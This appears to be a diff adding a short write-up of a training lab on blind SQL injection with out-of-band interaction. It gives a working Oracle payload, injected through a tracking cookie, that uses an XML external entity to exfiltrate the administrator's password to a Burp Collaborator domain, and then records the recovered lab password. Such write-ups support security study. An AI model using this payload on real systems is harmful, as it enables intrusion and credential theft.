@@ -1,0 +1,22 @@
+Lab #16: Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - Tracking cookie
+
+End Goals:
+
+(1) Exploit SQLi to output the password of the administrator user
+(2) Login as the administrator user
+
+Analysis:
+
+Burp collabrator domain:
+mg649nrejd986xen5ff8bxr75ybozd.oastify.com
+
+payload :
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote 
+SYSTEM "http://'||(select password from users where username='administrator')||
+'.mg649nrejd986xen5ff8bxr75ybozd.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+
+password:
+8rtzegx37uptozprzsxs
